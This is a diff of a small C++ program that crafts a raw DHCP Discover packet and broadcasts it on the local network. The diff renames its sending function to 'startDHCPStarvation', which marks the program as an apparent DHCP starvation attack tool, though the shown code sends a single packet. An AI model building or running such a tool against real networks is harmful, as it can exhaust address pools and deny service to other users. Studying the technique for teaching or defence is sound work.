@@ -13,7 +13,7 @@
 
 
 
-void sendDHCPpacket(AddressInfo& info)
+void startDHCPStarvation(AddressInfo& info)
 {
 	
 	SOCKET s;
@@ -27,17 +27,23 @@ void sendDHCPpacket(AddressInfo& info)
 		std::cout << "Socket error <" << WSAGetLastError() << ">" << std::endl;
 #endif
 
-	setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char*)&optval, sizeof optval);
+	setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char*)&optval, sizeof optval); //Set the socket as a RAW socket
 
 	dst.sin_family = AF_INET;
-	dst.sin_port = htons(67);
+	dst.sin_port = htons(67);								/* difine the destination */
 	inet_pton(AF_INET, info.broadcast, &dst.sin_addr.s_addr);
 
 	char* raw_packet = new char[65536];
 
 	CreateDHCPDiscoverPacket(raw_packet, info);
 
-	sendto(s, raw_packet, sizeof(IP_header) + sizeof(UDP_header) + sizeof(DHCP_header) , 0, (sockaddr*)&dst, sizeof(dst));
+	sendto(
+		s,
+		raw_packet,
+		sizeof(IP_header) + sizeof(UDP_header) + sizeof(DHCP_header) ,
+		0, (sockaddr*)&dst, 
+		sizeof(dst)
+	);
 	delete[] raw_packet;
 }
 
@@ -48,6 +54,7 @@ int main()
 
 	AddressInfo info{};
 	getAddrInfo(&info);
+
 #if _DEBUG
 	std::cout << 
 		info.hostName 
@@ -59,5 +66,6 @@ int main()
 		info.broadcast 
 		<< std::endl;
 #endif
-	sendDHCPpacket(info);
+
+	startDHCPStarvation(info);
 }
